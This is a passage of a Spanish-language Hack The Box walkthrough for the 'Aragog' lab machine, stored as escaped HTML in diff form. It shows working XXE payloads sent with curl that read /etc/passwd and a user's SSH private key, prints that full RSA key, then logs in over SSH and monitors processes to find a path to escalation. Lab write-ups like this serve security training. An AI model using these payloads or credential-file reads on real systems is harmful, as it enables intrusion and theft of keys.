-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lo ejecutamos y vemos que no obtenemos algún resultado. Esto puede ser porque al servidor no le gusta el wrapper &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expect&lt;/code&gt;, así que vamos a utilizar otro, como por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;?&amp;gt;
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE foo
-  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ELEMENT foo ANY &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-   &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY xxe SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;file:///etc/passwd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;
-&amp;lt;details&amp;gt;
-    &amp;lt;subnet_mask&amp;gt;&amp;amp;xxe&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/subnet_mask&amp;gt;
-    &amp;lt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/test&amp;gt;
-&amp;lt;/details&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lo ejecutamos y podemos ser el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; de la máquina víctima; por lo que podemos visualizar contenido del sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; @test.txt http://10.10.10.78/hosts.php
-                                                                
-There are 4294967294 possible hosts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin       
-sys:x:3:3:sys:/dev:/usr/sbin/nologin             
-&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync                 
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin     
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin        
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                  
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                              
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                             
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                             
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                    
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                 
-gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false                                                                                        
-_apt:x:105:65534::/nonexistent:/bin/false                                                                                        
-messagebus:x:106:110::/var/run/dbus:/bin/false         
-uuidd:x:107:111::/run/uuidd:/bin/false                                                                                           
-lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false                  
-whoopsie:x:109:117::/nonexistent:/bin/false                 
-avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
-avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
-dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
-speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
-kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false 
-pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
-rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false  
-saned:x:119:127::/var/lib/saned:/bin/false     
-usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
-florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
-cliff:x:1001:1001::/home/cliff:/bin/bash
-mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
-sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
-ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aquí podemos ver los usuarios del sistema &lt;em&gt;florian&lt;/em&gt; y &lt;em&gt;cliff&lt;/em&gt;. Pensando un poco, tenemos usuarios del sistema, el puerto 22 abierto y podemos ver archivos de sistema; con eso vamos a tratar de obtener el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; de los usuarios para tratar de conectarnos a la máquina víctima por SSH sin proporcionar contraseña.&lt;/p&gt;
-
-&lt;h4 id=&quot;testtxt&quot;&gt;test.txt&lt;/h4&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;?&amp;gt;
-  &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE foo
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ELEMENT foo ANY &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY xxe SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;file:///home/florian/.ssh/id_rsa&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;
-  &amp;lt;details&amp;gt;
-      &amp;lt;subnet_mask&amp;gt;&amp;amp;xxe&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/subnet_mask&amp;gt;
-      &amp;lt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/test&amp;gt;
-  &amp;lt;/details&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;ejecución&quot;&gt;Ejecución&lt;/h4&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; @test.txt http://10.10.10.78/hosts.php
-
-There are 4294967294 possible hosts &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
-MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
-+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
-lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
-1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
-Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
-d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
-AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
-TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
-9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
-/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
-0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
-sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
-Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
-zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
-rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
-tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
-HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
-I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
-ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
-HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
-kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
-4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
-7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
-daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
-uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos copiamos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; a un archivo con mismo nombre y le damos permisos 600:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ vi id_rsa
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_rsa
-───────┬──────────────────────────────────────────────────────────────
-       │ File: id_rsa
-───────┼──────────────────────────────────────────────────────────────
-   1   │ &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
-   2   │ MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
-   3   │ +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
-   4   │ lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
-   5   │ 1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
-   6   │ Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
-   7   │ d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
-   8   │ AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
-   9   │ TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
-  10   │ 9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
-  11   │ /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
-  12   │ 0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
-  13   │ sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
-  14   │ Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
-  15   │ zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
-  16   │ rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
-  17   │ tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
-  18   │ HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
-  19   │ I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
-  20   │ ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
-  21   │ HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
-  22   │ kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
-  23   │ 4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
-  24   │ 7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
-  25   │ daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
-  26   │ uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
-  27   │ &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
-❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora vamos a conectarnos a la máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa florian@10.10.10.78
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.78 (10.10.10.78)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
-ECDSA key fingerprint is SHA256:phu0FjQg/9nCmL2014AJ9yH4akvraA7Ea5QtE59wqD4.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '&lt;/span&gt;10.10.10.78&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
-Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3
-florian@aragog:~$ whoami
-florian
-florian@aragog:~$
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya estamos dentro de la máquina como el usuario &lt;em&gt;florian&lt;/em&gt; y a partir de aquí podemos visualizar la flag (user.txt).  Nos queda escalar privilegios, así que vamos a enumerar un poco el sistema:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
-total 32
-drwxrwxrwx 4 www-data www-data  4096 Sep 20 12:35 ./
-drwxr-xr-x 3 root     root      4096 Dec 18  2017 ../
-drwxrwxrwx 5 cliff    cliff     4096 Sep 20 12:35 dev_wiki/
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data   689 Dec 21  2017 hosts.php
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 11321 Dec 18  2017 index.html
-drw-r--r-- 5 cliff    cliff     4096 Dec 20  2017 zz_backup/
-florian@aragog:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var/www/html&lt;/code&gt; se tienen varios recursos asociados al sitio web. Algo raro que notamos es que el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev_wiki/&lt;/code&gt; está asignado al grupo y al usuario &lt;em&gt;cliff&lt;/em&gt;; pero nosotros como el usuario &lt;em&gt;florian&lt;/em&gt; tenemos permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rwx&lt;/code&gt;. Podemos pensar en ver los archivos dentro de dicho directorio, pero antes de eso, vamos a listar los procesos que se estan ejecutando en el sistema a intervalos regulares con la creación del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;procmon.sh&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm/
-florian@aragog:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;procmon.sh
-florian@aragog:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x procmon.sh
-florian@aragog:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano procmon.sh
-florian@aragog:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;procmon.sh 
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
-        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;new_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-        diff &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$old_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;lt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;command|procmon&quot;&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;done
-
-&lt;/span&gt;florian@aragog:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos nuestro script:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;florian@aragog:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh 
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&amp;lt; /usr/bin/python /home/cliff/wp-login.py
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/bash /root/restore.sh
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/bash /root/restore.sh
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/www/html/dev_wiki/
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/python /home/cliff/wp-login.py
-&amp;lt; &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/www/html/dev_wiki/
-&amp;lt; /usr/bin/python /home/cliff/wp-login.py
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 777 /var/www/html/dev_wiki/
-&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/bash /root/restore.sh
-&amp;lt; /bin/bash /root/restore.sh
-&amp;lt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 777 /var/www/html/dev_wiki/
-^C
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Del resultado, vemos que se está ejecutando el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/cliff/wp-login.py&lt;/code&gt;, un archivo en python relacionado a un posible WordPress (por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-login&lt;/code&gt;), tal vez una posible autenticación. Además, vemos que se ejecuta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/restore.sh&lt;/code&gt; que restablece los archivo en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/dev_wiki/&lt;/code&gt;. Si ingresamos a la página &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.78/dev_wiki&lt;/code&gt; , nos redirecciona a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://aragog/dev_wiki/&lt;/code&gt;, así que agremos &lt;strong&gt;aragog&lt;/strong&gt; a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y así podemos ver el recurso.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-aragog/aragog_wiki.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que el sitio hace uso de WordPress, por lo que debe de existir su panel de administración en &lt;a href=&quot;http://aragog/dev_wiki/wp-login.php&quot;&gt;wp-admin&lt;/a&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-aragog/aragog_wordpress.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
